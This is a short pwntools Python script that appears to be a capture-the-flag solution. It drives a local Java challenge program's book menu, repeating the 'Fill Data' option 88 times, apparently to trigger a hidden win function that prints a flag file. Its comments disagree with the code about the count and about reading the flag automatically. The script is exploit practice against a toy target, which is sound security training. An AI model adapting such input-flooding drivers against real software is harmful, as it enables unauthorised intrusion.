from pwn import *

# Start the Java process with the compiled class file
java_process = process(['java', 'chall'])
# context.log_level = 'DEBUG'
# Function to interact with the menu and simulate user input
def interact_menu(option, input_data=None):
    java_process.recvuntil(b'Book Edition\n')
    java_process.recvuntil(b'1.Fill Data\n')
    java_process.recvuntil(b'2.Read Data\n')
    java_process.recvuntil(b'3.Exit\n')
    java_process.sendline(str(option).encode())  # Send the menu option
    if input_data:
        java_process.sendline(input_data.encode())  # Send the input data if needed

# Simulate filling data for 3 books
for i in range(88):
    interact_menu(1, 'Book')


# After the third book, the `win` function will be triggered
# The script should automatically read the flag.txt content
# output = java_process.recvall().decode()
# print(output)

# Optionally, you can interact with the 'Read Data' option to see stored book names
# interact_menu(2)

# Close the process
java_process.interactive()
java_process.close()
